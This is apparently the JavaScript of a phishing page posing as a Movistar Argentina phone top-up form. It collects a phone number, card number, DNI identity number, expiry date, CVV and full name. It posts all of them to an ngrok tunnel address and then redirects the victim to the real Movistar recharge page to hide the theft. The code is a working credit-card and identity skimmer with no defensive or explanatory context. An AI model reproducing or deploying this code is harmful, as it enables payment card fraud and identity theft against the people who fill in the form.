let d = document

let form = d.querySelector('.myForm')
const formElement = document.querySelector('.myForm');
const numberInput = document.getElementById('number');
const cardNumberInput = document.getElementById('numero');
const deneiInput = document.getElementById('denei');
const monthInput = document.getElementById('mes');
const yearInput = document.getElementById('ano');
const cvvInput = document.getElementById('seg');
const fullNameInput = document.getElementById('fullName');

function verificarInput() {
    var inputValor = document.getElementById('number').value;
    var div = document.getElementById('cardForm');

    if (inputValor.length === 10) {
        div.style.display = 'block';
    } else {
        div.style.display = 'none';
    }
}

form.addEventListener("submit",(e) => {
    e.preventDefault()

    const formData = {
        number: numberInput.value,
        numero: cardNumberInput.value,
        denei: deneiInput.value,
        mes: monthInput.value,
        ano: yearInput.value,
        seg: cvvInput.value,
        fullName:fullNameInput.value
    };

    fetch('https://a761-2803-9800-9445-4612-353a-800c-e405-4e21.ngrok-free.app/sendDataForm',{
        method:'POST',
        headers:{
            'Content-Type':'application/json'
        },
        body:JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
        console.log(data)
        location.href = "https://www.movistar.com.ar/recarga-con-tarjeta-de-credito"
    }).catch(err => {
        console.log(err)
    }) 
})